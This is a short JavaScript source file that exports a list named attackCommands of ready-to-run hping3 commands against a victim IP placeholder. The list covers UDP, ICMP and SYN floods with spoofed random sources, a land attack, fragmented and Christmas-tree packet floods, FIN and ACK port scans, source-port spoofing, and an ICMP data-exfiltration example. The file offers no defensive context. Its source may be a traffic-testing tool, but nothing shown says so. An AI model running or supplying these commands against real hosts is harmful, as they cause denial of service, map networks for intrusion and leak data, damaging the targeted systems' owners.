export const attackCommands = [
  {
    key: "udpFlood",
    command: "hping3 --udp <victim_IP> -p 53 --flood --rand-source"
  },
  {
    key: "icmpFlood",
    command: "hping3 -1 <victim_IP> --flood --rand-source"
  },
  {
    key: "fragmentedPacket",
    command: "hping3 -S <victim_IP> -p 80 -f -d 2000 --flood"
  },
  {
    key: "tcpFinScan",
    command: "hping3 --scan 1-1000 -F <victim_IP>"
  },
  {
    key: "christmasTree",
    command: "hping3 -S -F -P -U -A -R -X -Y <victim_IP> -p 22 --flood"
  },
  {
    key: "customHttpGet",
    command: `hping3 -S -p 80 <victim_IP> -E request.txt -d $(wc -c < request.txt) -V`
  },
  {
    key: "tcpAckScan",
    command: "hping3 --scan 1-1000 -A <victim_IP>"
  },
  {
    key: "spoofedPort",
    command: "hping3 -S -s 443 -k -p 80 <victim_IP>"
  },
  {
    key: "adjustPacketTiming",
    command: "hping3 -S <victim_IP> -p 22 --flood --fast -i u1000"
  },
  {
    key: "icmpExfiltration",
    command: "hping3 -1 <victim_IP> -e \"secret_data\" -d 100 -c 10"
  },
  {
    key: "ttlManipulation",
    command: "hping3 -S <victim_IP> -p 80 -t 1 -c 5"
  },
  {
    key: "traceroute",
    command: "hping3 --traceroute -S -p 80 <victim_IP>"
  },
  {
    key: "customPattern",
    command: "hping3 -d 64 --data 0xdeadbeef <victim_IP>"
  },
  {
    key: "mtuTest",
    command: "hping3 -d 1500 -S <victim_IP> -p 80 -c 1"
  },
  {
    key: "synFlood",
    command: "hping3 -S <victim_IP> -p 135 --flood"
  },
  {
    key: "randomData",
    command: "hping3 <victim_IP> --data 100000"
  },
  {
    key: "landAttack",
    command: "hping3 -S <victim_IP> -a <victim_IP> -p 135 --flood"
  },
  {
    key: "massiveSynFlood",
    command: "hping3 -c 10000 -d 10000 -S <victim_IP> -p 135 --flood --rand-source"
  }
];